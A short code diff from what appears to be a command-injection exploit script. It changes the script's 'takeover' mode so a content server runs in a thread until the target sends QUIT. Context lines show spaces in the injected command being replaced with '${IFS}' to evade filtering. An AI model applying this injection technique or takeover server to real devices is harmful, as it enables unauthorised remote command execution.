@@ -286,9 +286,10 @@ def dst_command_req():
     global stage
     
     if (args.takeover):
-        http_start, http_stop = takeover.http_server(listen_port)
-        http_start()
-
+        import threading
+        http_srv_thread = threading.Thread(target=takeover.run_server, args=(listen_ip, listen_port))
+        logging("+ Starting content server (will run until QUIT is received from target)\n")
+        http_srv_thread.start()
 
     cmd_ifs = exe_cmd.replace(' ', "${IFS}")
     
@@ -304,8 +305,10 @@ def dst_command_req():
     dst_reset_req()
 
     if (args.takeover):
-        sleep(60)
-        http_stop()
+        while (takeover.srv_run):
+            sleep(1)
+        logging("+ QUIT received. Stopping content server\n")
+        http_srv_thread.join()
 
 
     stage += 1
